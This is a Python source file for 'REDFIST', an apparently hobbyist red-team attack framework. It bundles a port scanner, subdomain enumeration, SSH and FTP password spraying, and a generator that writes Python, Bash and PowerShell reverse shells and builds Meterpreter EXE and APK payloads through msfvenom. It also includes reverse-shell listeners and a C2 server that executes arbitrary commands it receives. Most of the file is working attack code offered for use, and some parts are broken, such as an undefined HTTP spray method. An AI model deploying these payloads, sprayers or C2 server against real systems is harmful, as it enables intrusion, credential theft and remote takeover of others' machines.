#!/usr/bin/env python3
"""
REDFIST - Red Team Framework for Infrastructure Security Testing
Modernized with advanced features and beautiful interface
Creator: Fazo
"""

import argparse
import requests
import threading
import socket
import subprocess
import os
import sys
import time
import random
import urllib.parse
import json
import base64
import zipfile
import tempfile
from concurrent.futures import ThreadPoolExecutor
from http.server import HTTPServer, BaseHTTPRequestHandler
import platform
from datetime import datetime

# Suppress SSL warnings
requests.packages.urllib3.disable_warnings()

# Color codes for beautiful output
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

class RedFist:
    def __init__(self):
        self.banner()
        self.version = "2.0"
        self.creator = "Fazo"
        
    def banner(self):
        print(f"""{Colors.RED}{Colors.BOLD}
        ╔══════════════════════════════════════════════════════════════╗
        ║                                                              ║
        ║  ██████╗ ███████╗██████╗ ███████╗██╗███████╗████████╗       ║
        ║  ██╔══██╗██╔════╝██╔══██╗██╔════╝██║██╔════╝╚══██╔══╝       ║
        ║  ██████╔╝█████╗  ██║  ██║█████╗  ██║███████╗   ██║          ║
        ║  ██╔══██╗██╔══╝  ██║  ██║██╔══╝  ██║╚════██║   ██║          ║
        ║  ██║  ██║███████╗██████╔╝██║     ██║███████║   ██║          ║
        ║  ╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝     ╚═╝╚══════╝   ╚═╝          ║
        ║                                                              ║
        ║  {Colors.CYAN}RED TEAM ASSAULT FRAMEWORK v2.0{Colors.RED}                    ║
        ║  {Colors.YELLOW}Created by: {self.creator}{Colors.RED}                                ║
        ║  {Colors.GREEN}Advanced Infrastructure Security Testing{Colors.RED}           ║
        ║                                                              ║
        ╚══════════════════════════════════════════════════════════════╗
        {Colors.END}""")

    def print_status(self, message):
        print(f"{Colors.BLUE}[*]{Colors.END} {message}")

    def print_success(self, message):
        print(f"{Colors.GREEN}[+]{Colors.END} {message}")

    def print_warning(self, message):
        print(f"{Colors.YELLOW}[!]{Colors.END} {message}")

    def print_error(self, message):
        print(f"{Colors.RED}[-]{Colors.END} {message}")

    # MODULE 1: ADVANCED PORT SCANNER
    def port_scan(self, target, ports="1-1000", threads=100, scan_type="tcp"):
        """Advanced multi-threaded port scanner with service detection"""
        self.print_status(f"Scanning {target} ports {ports} with {threads} threads")
        
        def scan_port(ip, port):
            try:
                if scan_type == "tcp":
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                        s.settimeout(1)
                        result = s.connect_ex((ip, port))
                        if result == 0:
                            try:
                                service = socket.getservbyport(port)
                            except:
                                service = "unknown"
                            banner = self.get_banner(ip, port)
                            self.print_success(f"Port {port}/tcp open - {service} {banner}")
            except Exception as e:
                pass

        try:
            start_port, end_port = map(int, ports.split('-'))
            
            with ThreadPoolExecutor(max_workers=threads) as executor:
                for port in range(start_port, end_port + 1):
                    executor.submit(scan_port, target, port)
                    
            self.print_success("Port scan completed")
        except Exception as e:
            self.print_error(f"Port scan error: {e}")

    def get_banner(self, ip, port):
        """Attempt to grab service banner"""
        try:
            socket.setdefaulttimeout(2)
            s = socket.socket()
            s.connect((ip, port))
            banner = s.recv(1024).decode().strip()
            s.close()
            return f"Banner: {banner}" if banner else ""
        except:
            return ""

    # MODULE 2: ENHANCED SUBDOMAIN ENUMERATOR
    def subdomain_enum(self, domain, wordlist=None, use_apis=True):
        """Advanced subdomain enumeration with API support"""
        self.print_status(f"Enumerating subdomains for {domain}")
        
        if not wordlist:
            wordlist = "wordlists/common_subdomains.txt"
        
        subs_to_check = self.load_wordlist(wordlist)
        
        if not subs_to_check:
            self.print_error("No subdomains to check")
            return []
        
        found_subs = []
        
        # Add common subdomains if wordlist is missing
        if not subs_to_check:
            subs_to_check = ['www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop', 'ns1', 'webdisk', 'ns2', 'cpanel', 'whm', 'autodiscover']

        def check_subdomain(sub):
            subdomain = f"{sub}.{domain}".lower()
            for protocol in ['http', 'https']:
                url = f"{protocol}://{subdomain}"
                try:
                    response = requests.get(url, timeout=3, verify=False)
                    if response.status_code < 400:
                        self.print_success(f"Found: {url} [{response.status_code}]")
                        found_subs.append(url)
                        break
                except requests.RequestException:
                    continue

        # API-based enumeration
        if use_apis:
            found_subs.extend(self.api_subdomain_enum(domain))

        self.print_status(f"Checking {len(subs_to_check)} subdomains...")
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            executor.map(check_subdomain, subs_to_check)
        
        self.print_success(f"Found {len(found_subs)} subdomains")
        return found_subs

    def api_subdomain_enum(self, domain):
        """Use free APIs for subdomain enumeration"""
        self.print_status("Using APIs for subdomain discovery...")
        apis = [
            f"https://crt.sh/?q=%.{domain}&output=json",
            f"https://otx.alienvault.com/api/v1/indicators/domain/{domain}/passive_dns",
        ]
        
        found = []
        for api in apis:
            try:
                response = requests.get(api, timeout=10)
                if response.status_code == 200:
                    data = response.json()
                    # Parse results based on API format
                    if 'crt.sh' in api:
                        for item in data:
                            found.append(item['name_value'])
                    elif 'alienvault' in api:
                        for item in data.get('passive_dns', []):
                            found.append(item['hostname'])
            except:
                continue
        return list(set(found))

    # MODULE 3: ADVANCED PASSWORD SPRAYER
    def password_spray(self, target, username_list, password, port=22, protocol="ssh"):
        """Multi-protocol password spraying attack"""
        self.print_status(f"Password spraying {target} with {len(username_list)} users")
        
        if protocol == "ssh":
            self.ssh_spray(target, username_list, password, port)
        elif protocol == "ftp":
            self.ftp_spray(target, username_list, password, port)
        elif protocol == "http":
            self.http_spray(target, username_list, password, port)

    def ssh_spray(self, target, username_list, password, port):
        """SSH password spray"""
        try:
            import paramiko
        except ImportError:
            self.print_error("Paramiko not installed. Install with: pip install paramiko")
            return

        def try_ssh_login(ip, username, password, port):
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ip, port=port, username=username, password=password, timeout=5)
                self.print_success(f"SSH SUCCESS: {username}:{password}")
                ssh.close()
                return True
            except Exception as e:
                return False

        success_count = 0
        for username in username_list:
            if try_ssh_login(target, username, password, port):
                success_count += 1
            time.sleep(1)  # Rate limiting
        
        self.print_success(f"{success_count} valid SSH credentials found")

    def ftp_spray(self, target, username_list, password, port):
        """FTP password spray"""
        try:
            from ftplib import FTP
        except ImportError:
            self.print_error("FTP lib not available")
            return

        def try_ftp_login(ip, username, password, port):
            try:
                ftp = FTP()
                ftp.connect(ip, port, timeout=5)
                ftp.login(username, password)
                self.print_success(f"FTP SUCCESS: {username}:{password}")
                ftp.quit()
                return True
            except Exception as e:
                return False

        success_count = 0
        for username in username_list:
            if try_ftp_login(target, username, password, port):
                success_count += 1
            time.sleep(1)
        
        self.print_success(f"{success_count} valid FTP credentials found")

    # MODULE 4: ADVANCED PAYLOAD GENERATOR
    def generate_payload(self, lhost, lport, payload_type="reverse_shell", output_format="python", auto_listener=False):
        """Advanced payload generator with multiple formats"""
        self.print_status(f"Generating {payload_type.upper()} payload for {output_format.upper()}")
        
        payloads = {
            "reverse_shell": {
                "python": self.generate_python_reverse_shell,
                "bash": self.generate_bash_reverse_shell,
                "powershell": self.generate_powershell_reverse_shell,
                "exe": self.generate_exe_payload,
                "apk": self.generate_apk_payload,
                "mac": self.generate_macos_payload
            },
            "meterpreter": {
                "exe": self.generate_meterpreter_exe,
                "apk": self.generate_meterpreter_apk
            }
        }
        
        if payload_type in payloads and output_format in payloads[payload_type]:
            payload_func = payloads[payload_type][output_format]
            payload_file = payload_func(lhost, lport)
            
            if auto_listener:
                self.start_auto_listener(lhost, lport, payload_type)
                
            return payload_file
        else:
            self.print_error(f"Unsupported payload type: {payload_type} for format: {output_format}")
            return None

    def generate_python_reverse_shell(self, lhost, lport):
        """Generate Python reverse shell"""
        payload = f'''import socket,subprocess,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")'''
        
        filename = "payload.py"
        with open(filename, "w") as f:
            f.write(payload)
        
        self.print_success(f"Python payload saved as {filename}")
        return filename

    def generate_bash_reverse_shell(self, lhost, lport):
        """Generate Bash reverse shell"""
        payload = f'''bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'''
        
        filename = "payload.sh"
        with open(filename, "w") as f:
            f.write(payload)
        
        self.print_success(f"Bash payload saved as {filename}")
        return filename

    def generate_powershell_reverse_shell(self, lhost, lport):
        """Generate PowerShell reverse shell"""
        payload = f'''$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport})
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{{0}}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}}
$client.Close()'''
        
        filename = "payload.ps1"
        with open(filename, "w") as f:
            f.write(payload)
        
        self.print_success(f"PowerShell payload saved as {filename}")
        return filename

    def generate_exe_payload(self, lhost, lport):
        """Generate Windows EXE payload using msfvenom"""
        self.print_status("Generating Windows EXE payload (requires msfvenom)")
        
        try:
            cmd = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o payload.exe"
            subprocess.run(cmd, shell=True, check=True)
            self.print_success("EXE payload generated as payload.exe")
            return "payload.exe"
        except Exception as e:
            self.print_error(f"EXE generation failed: {e}")
            return None

    def generate_apk_payload(self, lhost, lport):
        """Generate Android APK payload"""
        self.print_status("Generating Android APK payload (requires msfvenom)")
        
        try:
            cmd = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o payload.apk"
            subprocess.run(cmd, shell=True, check=True)
            self.print_success("APK payload generated as payload.apk")
            return "payload.apk"
        except Exception as e:
            self.print_error(f"APK generation failed: {e}")
            return None

    def generate_macos_payload(self, lhost, lport):
        """Generate macOS payload"""
        self.print_status("Generating macOS payload")
        
        payload = f'''#!/bin/bash
bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'''
        
        filename = "payload_macos.sh"
        with open(filename, "w") as f:
            f.write(payload)
        
        os.chmod(filename, 0o755)
        self.print_success(f"macOS payload saved as {filename}")
        return filename

    def generate_meterpreter_exe(self, lhost, lport):
        """Generate Meterpreter EXE"""
        return self.generate_exe_payload(lhost, lport)

    def generate_meterpreter_apk(self, lhost, lport):
        """Generate Meterpreter APK"""
        return self.generate_apk_payload(lhost, lport)

    def start_auto_listener(self, lhost, lport, payload_type):
        """Start automatic listener based on payload type"""
        self.print_status(f"Starting auto listener on {lhost}:{lport}")
        
        if payload_type == "reverse_shell":
            self.start_reverse_listener(lhost, lport)
        elif payload_type == "meterpreter":
            self.start_meterpreter_listener(lhost, lport)

    def start_reverse_listener(self, lhost, lport):
        """Start basic reverse shell listener"""
        def listener():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.bind((lhost, lport))
                sock.listen(1)
                self.print_success(f"Reverse shell listener started on {lhost}:{lport}")
                
                client, addr = sock.accept()
                self.print_success(f"Connection received from {addr[0]}:{addr[1]}")
                
                while True:
                    command = input("shell> ")
                    if command.lower() == 'exit':
                        break
                    client.send(command.encode() + b'\n')
                    response = client.recv(4096).decode()
                    print(response)
                    
                client.close()
                sock.close()
            except Exception as e:
                self.print_error(f"Listener error: {e}")

        thread = threading.Thread(target=listener)
        thread.daemon = True
        thread.start()

    def start_meterpreter_listener(self, lhost, lport):
        """Start Meterpreter listener (requires Metasploit)"""
        self.print_status("Starting Meterpreter listener")
        
        rc_file = f"""use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
exploit -j
"""
        
        with open("listener.rc", "w") as f:
            f.write(rc_file)
        
        try:
            subprocess.run(f"msfconsole -r listener.rc", shell=True)
        except Exception as e:
            self.print_error(f"Meterpreter listener failed: {e}")

    # MODULE 5: ADVANCED C2 SERVER
    def c2_server(self, port=4444, password=None):
        """Enhanced Command and Control server with authentication"""
        self.print_status(f"Starting C2 server on port {port}")
        
        if not password:
            password = self.generate_password()

        def handle_client(client_socket, address):
            try:
                self.print_success(f"New connection from {address[0]}:{address[1]}")
                client_socket.send(b"REDFIST C2 Authentication Required\nPassword: ")
                
                # Simple authentication
                auth_attempt = client_socket.recv(1024).decode().strip()
                if auth_attempt != password:
                    client_socket.send(b"Authentication failed!\n")
                    client_socket.close()
                    return
                
                client_socket.send(b"Authentication successful!\nREDFIST_C2> ")
                
                while True:
                    cmd = client_socket.recv(1024).decode().strip()
                    
                    if not cmd:
                        break
                    
                    if cmd.lower() == 'exit':
                        client_socket.send(b"Connection closed\n")
                        break
                    
                    if cmd.lower() == 'help':
                        help_text = """
Available commands:
- help: Show this help
- exit: Close connection
- sysinfo: Get system information
- download <file>: Download file
- upload <file>: Upload file
- Any system command
REDFIST_C2> """
                        client_socket.send(help_text.encode())
                        continue
                    
                    # Execute command
                    try:
                        if cmd == 'sysinfo':
                            info = f"""
System Information:
- Platform: {platform.system()}
- Release: {platform.release()}
- Version: {platform.version()}
- Machine: {platform.machine()}
- Processor: {platform.processor()}
"""
                            client_socket.send(info.encode() + b"REDFIST_C2> ")
                        else:
                            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=30)
                            client_socket.send(output + b"\nREDFIST_C2> ")
                    except subprocess.TimeoutExpired:
                        client_socket.send(b"Command timed out\nREDFIST_C2> ")
                    except Exception as e:
                        client_socket.send(f"Error: {str(e)}\nREDFIST_C2> ".encode())
            except Exception as e:
                self.print_error(f"Client handling error: {e}")
            finally:
                client_socket.close()
                self.print_warning(f"Connection closed: {address[0]}:{address[1]}")

        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind(('0.0.0.0', port))
            server.listen(5)
            
            self.print_success(f"C2 server listening on 0.0.0.0:{port}")
            self.print_success(f"Authentication password: {password}")
            self.print_status("Waiting for connections...")
            
            while True:
                client, addr = server.accept()
                client_handler = threading.Thread(target=handle_client, args=(client, addr))
                client_handler.daemon = True
                client_handler.start()
                
        except KeyboardInterrupt:
            self.print_success("C2 server stopped")
        except Exception as e:
            self.print_error(f"C2 server error: {e}")
        finally:
            server.close()

    def generate_password(self, length=12):
        """Generate random password"""
        import string
        chars = string.ascii_letters + string.digits + string.punctuation
        return ''.join(random.choice(chars) for _ in range(length))

    # MODULE 6: NETWORK SNIFFER
    def network_sniff(self, interface=None, count=100, filter_str=None):
        """Enhanced network packet sniffer"""
        self.print_status("Starting network sniffer")
        try:
            from scapy.all import sniff, IP, TCP, UDP, DNS, DNSQR, Raw
        except ImportError:
            self.print_error("Scapy not installed. Run: pip install scapy")
            return

        def packet_callback(packet):
            if IP in packet:
                ip_src = packet[IP].src
                ip_dst = packet[IP].dst
                protocol = packet[IP].proto
                
                info = ""
                color = Colors.WHITE
                
                if TCP in packet:
                    sport = packet[TCP].sport
                    dport = packet[TCP].dport
                    info = f"TCP {ip_src}:{sport} -> {ip_dst}:{dport}"
                    color = Colors.CYAN
                    
                    # HTTP detection
                    if dport == 80 or sport == 80:
                        if Raw in packet:
                            try:
                                payload = packet[Raw].load.decode('utf-8', errors='ignore')
                                if 'HTTP' in payload:
                                    info = f"HTTP {ip_src} -> {ip_dst}"
                                    color = Colors.GREEN
                            except:
                                pass
                
                elif UDP in packet:
                    info = f"UDP {ip_src}:{packet[UDP].sport} -> {ip_dst}:{packet[UDP].dport}"
                    color = Colors.YELLOW
                
                elif DNS in packet:
                    if DNSQR in packet:
                        query = packet[DNSQR].qname.decode() if hasattr(packet[DNSQR].qname, 'decode') else str(packet[DNSQR].qname)
                        info = f"DNS Query: {query}"
                        color = Colors.MAGENTA
                
                if info:
                    print(f"{color}[PACKET] {info}{Colors.END}")

        try:
            sniff(iface=interface, prn=packet_callback, count=count, filter=filter_str)
        except Exception as e:
            self.print_error(f"Sniffing error: {e}")

    # MODULE 7: VULNERABILITY SCANNER
    def vulnerability_scan(self, target, scan_type="web"):
        """Basic vulnerability scanner"""
        self.print_status(f"Starting {scan_type} vulnerability scan for {target}")
        
        if scan_type == "web":
            self.web_vuln_scan(target)
        elif scan_type == "network":
            self.network_vuln_scan(target)

    def web_vuln_scan(self, target):
        """Web application vulnerability scanner"""
        common_paths = [
            "/admin", "/login", "/phpinfo.php", "/.git", "/backup",
            "/wp-admin", "/administrator", "/.env", "/api", "/debug"
        ]
        
        for path in common_paths:
            url = f"http://{target}{path}" if not target.startswith('http') else f"{target}{path}"
            try:
                response = requests.get(url, timeout=3, verify=False)
                if response.status_code == 200:
                    self.print_success(f"Found: {url} [200]")
                elif response.status_code == 403:
                    self.print_warning(f"Found (restricted): {url} [403]")
            except:
                pass

    # UTILITY FUNCTIONS
    def load_wordlist(self, filename):
        """Load wordlist from file"""
        try:
            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            self.print_error(f"Wordlist not found: {filename}")
            return []
        except Exception as e:
            self.print_error(f"Error loading wordlist: {e}")
            return []

    def show_modules(self):
        """Display available modules"""
        modules = {
            "Port Scanning": "Advanced TCP port scanner with service detection",
            "Subdomain Enumeration": "Find subdomains with wordlist and API support",
            "Password Spraying": "Multi-protocol password spraying attacks",
            "Payload Generation": "Generate various payloads (Python, Bash, PowerShell, EXE, APK, macOS)",
            "C2 Server": "Command and Control server with authentication",
            "Network Sniffing": "Packet capture and analysis",
            "Vulnerability Scanning": "Basic web and network vulnerability scanning"
        }
        
        print(f"\n{Colors.CYAN}{Colors.BOLD}Available Modules:{Colors.END}")
        for module, description in modules.items():
            print(f"  {Colors.GREEN}▶{Colors.END} {Colors.BOLD}{module}:{Colors.END} {description}")

def main():
    parser = argparse.ArgumentParser(
        description="REDFIST v2.0 - Modern Red Team Framework by Fazo",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
{Colors.CYAN}{Colors.BOLD}Examples:{Colors.END}
  # Port scanning with service detection
  {Colors.GREEN}python redfist.py scan 192.168.1.1 -p 1-1000 -t 50{Colors.END}
  
  # Subdomain enumeration with APIs
  {Colors.GREEN}python redfist.py subdomains example.com -a{Colors.END}
  
  # Generate EXE payload with auto listener
  {Colors.GREEN}python redfist.py payload 192.168.1.100 4444 -t meterpreter -f exe -l{Colors.END}
  
  # Advanced C2 server
  {Colors.GREEN}python redfist.py c2 -p 4444 -a{Colors.END}
  
  # Vulnerability scanning
  {Colors.GREEN}python redfist.py vuln 192.168.1.1 -t web{Colors.END}

  # Show all modules
  {Colors.GREEN}python redfist.py modules{Colors.END}
        """
    )
    
    subparsers = parser.add_subparsers(dest='command', help='Commands')
    
    # Port scan command
    scan_parser = subparsers.add_parser('scan', help='Port scanning')
    scan_parser.add_argument('target', help='Target IP or hostname')
    scan_parser.add_argument('-p', '--ports', default='1-1000', help='Port range (default: 1-1000)')
    scan_parser.add_argument('-t', '--threads', type=int, default=100, help='Threads (default: 100)')
    scan_parser.add_argument('-s', '--scan-type', default='tcp', choices=['tcp', 'udp'], help='Scan type')
    
    # Subdomain enumeration
    sub_parser = subparsers.add_parser('subdomains', help='Subdomain enumeration')
    sub_parser.add_argument('domain', help='Target domain')
    sub_parser.add_argument('-w', '--wordlist', help='Custom wordlist file')
    sub_parser.add_argument('-a', '--api', action='store_true', help='Use API enumeration')
    
    # Password spray
    spray_parser = subparsers.add_parser('spray', help='Password spraying')
    spray_parser.add_argument('target', help='Target IP')
    spray_parser.add_argument('-u', '--users', required=True, help='Username list file')
    spray_parser.add_argument('-p', '--password', required=True, help='Password to spray')
    spray_parser.add_argument('--port', type=int, default=22, help='Target port (default: 22)')
    spray_parser.add_argument('--protocol', default='ssh', choices=['ssh', 'ftp', 'http'], help='Protocol')
    
    # Network sniff
    sniff_parser = subparsers.add_parser('sniff', help='Network sniffing')
    sniff_parser.add_argument('-i', '--interface', help='Network interface')
    sniff_parser.add_argument('-c', '--count', type=int, default=100, help='Packet count')
    sniff_parser.add_argument('-f', '--filter', help='BPF filter')
    
    # Payload generator
    payload_parser = subparsers.add_parser('payload', help='Generate payload')
    payload_parser.add_argument('lhost', help='Listener IP')
    payload_parser.add_argument('lport', type=int, help='Listener port')
    payload_parser.add_argument('-t', '--type', default='reverse_shell', 
                               choices=['reverse_shell', 'meterpreter'], help='Payload type')
    payload_parser.add_argument('-f', '--format', default='python',
                               choices=['python', 'bash', 'powershell', 'exe', 'apk', 'mac'], 
                               help='Output format')
    payload_parser.add_argument('-l', '--listener', action='store_true', help='Start auto listener')
    
    # C2 Server
    c2_parser = subparsers.add_parser('c2', help='Start C2 server')
    c2_parser.add_argument('-p', '--port', type=int, default=4444, help='C2 port')
    c2_parser.add_argument('-a', '--auth', action='store_true', help='Enable authentication')
    
    # Vulnerability scan
    vuln_parser = subparsers.add_parser('vuln', help='Vulnerability scanning')
    vuln_parser.add_argument('target', help='Target IP or URL')
    vuln_parser.add_argument('-t', '--type', default='web', choices=['web', 'network'], help='Scan type')
    
    # Modules command
    subparsers.add_parser('modules', help='Show available modules')
    
    args = parser.parse_args()
    
    if not args.command:
        parser.print_help()
        return
    
    rf = RedFist()
    
    try:
        if args.command == 'scan':
            rf.port_scan(args.target, args.ports, args.threads, args.scan_type)
        elif args.command == 'subdomains':
            rf.subdomain_enum(args.domain, args.wordlist, args.api)
        elif args.command == 'spray':
            users = rf.load_wordlist(args.users)
            if users:
                rf.password_spray(args.target, users, args.password, args.port, args.protocol)
        elif args.command == 'sniff':
            rf.network_sniff(args.interface, args.count, args.filter)
        elif args.command == 'payload':
            rf.generate_payload(args.lhost, args.lport, args.type, args.format, args.listener)
        elif args.command == 'c2':
            password = rf.generate_password() if args.auth else None
            rf.c2_server(args.port, password)
        elif args.command == 'vuln':
            rf.vulnerability_scan(args.target, args.type)
        elif args.command == 'modules':
            rf.show_modules()
    except KeyboardInterrupt:
        rf.print_warning("Operation cancelled by user")
    except Exception as e:
        rf.print_error(f"Error: {e}")

if __name__ == "__main__":
    main()
